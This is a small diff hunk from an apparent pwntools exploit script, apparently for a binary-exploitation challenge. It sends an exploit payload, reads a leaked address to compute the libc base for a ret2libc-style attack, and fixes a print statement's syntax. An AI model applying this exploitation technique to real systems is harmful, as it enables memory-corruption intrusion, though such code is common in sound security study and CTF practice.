@@ -21,7 +21,7 @@ p.sendline(exp)
 
 p.recvuntil('0x')
 libc_base =int("0x"+p.recv(8),16)-x
-print "libc base: "hex(libc_base)
+print "libc base: ",hex(libc_base)
 
 pr = 0x804a010
 
